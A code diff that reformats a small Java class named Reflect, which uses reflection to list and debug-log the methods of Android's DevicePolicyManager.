@@ -1,12 +1,12 @@
 package com.android.syssetup;
 
-import java.lang.reflect.Method;
-
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 
 import com.android.syssetup.auto.Cfg;
 import com.android.syssetup.util.Check;
+
+import java.lang.reflect.Method;
 
 public class Reflect {
 	private static final String TAG = "Reflect";
@@ -15,7 +15,9 @@ public class Reflect {
 
 	static {
 		initCompatibility();
-	};
+	}
+
+	;
 
 	public static void initCompatibility() {
 		try {
@@ -28,19 +30,19 @@ public class Reflect {
 			// Print class methods
 			String sClassName = "android.app.admin.DevicePolicyManager";
 
-			try {  
-				Class classToInvestigate = Class.forName(sClassName);  
+			try {
+				Class classToInvestigate = Class.forName(sClassName);
 
-				Method[] aClassMethods = classToInvestigate.getDeclaredMethods();  
+				Method[] aClassMethods = classToInvestigate.getDeclaredMethods();
 
-				for (Method m : aClassMethods) {  
+				for (Method m : aClassMethods) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (initCompatibility) Method: " + m); //$NON-NLS-1$
 					}
-				}  
-			} catch (ClassNotFoundException e) {  
+				}
+			} catch (ClassNotFoundException e) {
 				// Class not found!  
-			} catch (Exception e) {  
+			} catch (Exception e) {
 				// Unknown exception  
 			}
 		} catch (NoSuchMethodException nsme) {
